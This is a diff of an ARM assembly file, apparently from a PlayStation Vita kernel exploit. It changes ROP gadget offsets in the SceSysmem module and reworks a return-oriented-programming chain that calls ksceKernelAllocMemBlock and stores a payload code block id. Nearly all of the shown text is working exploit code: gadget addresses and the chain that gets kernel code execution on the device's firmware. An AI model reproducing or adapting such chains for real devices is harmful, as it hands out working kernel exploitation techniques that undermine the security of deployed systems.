@@ -25,7 +25,7 @@
 .equ SceSysmem_ldr_r0_r0_blx_r3,                  0x11337
 
 // store
-.equ SceSysmem_str_r0_r3_movs_r0_0_pop_r4_pc,     0x18e25
+.equ SceSysmem_str_r0_r4_movs_r0_0_pop_r4_pc,     0x4f71
 
 // move
 .equ SceSysmem_mov_r2_r5_blx_r6,                  0x11e07
@@ -83,12 +83,9 @@
   push 0, NULL                                        // r3
   push 1, SceSysmem_ksceKernelAllocMemBlock           // r4
   push 1, SceSysmem_blx_r4_pop_r4_pc                  // pc
-  push 9, 0xDEADBEEF                                  // r4
-
+  push 2, payload_code_blockid                        // r4
   // Save code blockid
-  push 1, SceSysmem_pop_r3_pc                         // pc
-  push 2, payload_code_blockid                        // r3
-  push 1, SceSysmem_str_r0_r3_movs_r0_0_pop_r4_pc     // pc
+  push 1, SceSysmem_str_r0_r4_movs_r0_0_pop_r4_pc     // pc
   push 9, 0xDEADBEEF                                  // r4
 
   // Get code block
